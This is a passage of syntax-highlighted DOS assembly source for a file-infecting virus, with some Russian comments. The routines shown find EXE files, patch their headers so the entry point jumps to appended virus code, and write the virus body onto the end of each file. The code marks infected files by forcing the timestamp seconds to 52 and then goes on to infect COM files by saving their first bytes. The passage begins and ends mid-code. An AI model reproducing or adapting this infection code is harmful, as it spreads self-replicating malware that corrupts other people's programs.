           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">eS</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">eS</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">ExeIP</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; new IP to EOF</span><span class="sc0">
</span><span class="sc1">;-------------Count ReloCS------------------</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">shrdd</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc5">Hdrsize</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc5">ReloCS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc1">;---- Detect my place ----</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetMySize</span><span class="sc0">
          </span><span class="sc1">;------------------------------------</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_v_bady</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc1">;---- Count PageCnt -----------------</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">272</span><span class="sc0"> </span><span class="sc1">;!!!!size of dezsh !!?!!</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">stuff_size</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;new file size</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc1">;-- PageCnt:=(filesie div 512 )+1</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">shrdd</span><span class="sc0"> </span><span class="sc1">;div 512</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;+1</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">PageCnt</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc1">;---- Count partPag ----</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">fpos</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">fpos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">shrdd</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">shldd</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">partPag</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;NEW Heder Ok</span><span class="sc0">
</span><span class="sc1">;---------- Set hose bady ------------</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seekf_fpos</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@ERRORS_Infeckt_exe</span><span class="sc0">
</span><span class="sc1">;---- write dezsh+bady with jumper ----</span><span class="sc0">
        </span><span class="sc1">;BX=handel</span><span class="sc0">
        </span><span class="sc1">;CX=number of byte to read</span><span class="sc0">
        </span><span class="sc1">;DS:DX BUFFER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">HANDLER</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BEGIN_BADY</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">272</span><span class="sc0">                     </span><span class="sc1">;size of dezsh</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">STUFF_SIZE</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">writef</span><span class="sc0">
</span><span class="sc1">;----- Write new hade_exe --------</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seekf0</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">HANDLER</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">writef</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">END_Infeckt_exe</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------</span><span class="sc0">
</span><span class="sc5">MAKE52s</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;---пометка 52 с</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc5">handleR</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT21</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@_errorL</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1111111111100000b</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000000000011010b</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT21</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@_errorL</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@_errorL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">66H</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;------------------------------------------</span><span class="sc0">
</span><span class="sc5">closeFile</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc5">handleR</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closef</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------</span><span class="sc0">
</span><span class="sc5">retern_old_atr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">INCREM</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">FileNs</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">FileNs</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">SET_ART_SPESH</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GrateJobe</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">Find_files</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">EXE_file_not_found</span><span class="sc0">
                   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">NEX</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileOpen</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
                   </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ret_old_atr</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seekF0</span><span class="sc0">
                   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">read_heder</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc5">hade_exe</span><span class="sc4">],</span><span class="sc2">05a4dh</span><span class="sc0">
                   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exe_file</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">hade_exe</span><span class="sc4">],</span><span class="sc2">04d5ah</span><span class="sc0">    </span><span class="sc1">;************</span><span class="sc0">
                   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Ne_EXE</span><span class="sc0">
</span><span class="sc5">exe_file</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infeckt_exe</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make52s</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closeFile</span><span class="sc0">
                   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
</span><span class="sc5">ret_old_atr</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">retern_old_atr</span><span class="sc0">
                   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">;следующий</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc5">Find_files</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NEX</span><span class="sc0">
                   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EXE_file_not_found</span><span class="sc0">
</span><span class="sc5">Ne_EXE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closeFile</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">ret_old_atr</span><span class="sc0">
</span><span class="sc5">COM_file_not_fJ</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">COM_file_not_found</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------</span><span class="sc0">
</span><span class="sc5">EXE_file_not_found</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">path</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'c'</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">path</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'o'</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">path</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'m'</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">Find_files</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">path</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">path</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'X'</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">path</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">Find_files</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">COM_file_not_fJ</span><span class="sc0">
</span><span class="sc5">DDD</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">typeFile</span><span class="sc4">],</span><span class="sc2">033h</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">NEXt_COM</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FileOpen</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ComG_60K_J</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">seekF0</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc1">;---- Read old commands ---</span><span class="sc0">
           </span><span class="sc1">;bx=handel</span><span class="sc0">
           </span><span class="sc1">;CX=number of byte to read</span><span class="sc0">
           </span><span class="sc1">;DS:DX BUFFER</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_commands</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">add_c</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">readf</span><span class="sc0">
           </span><span class="sc1">;------------------------------------------</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_commands</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc2">05a4dh</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exe_file_2_J</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_commands</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc2">04d5ah</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exe_file_2_J</span><span class="sc0">
           </span><span class="sc1">;------------------------------------------</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_v_bady</span><span class="sc0">
           </span><span class="sc1">;------------------------------------------</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">Fpos</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">Fpos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
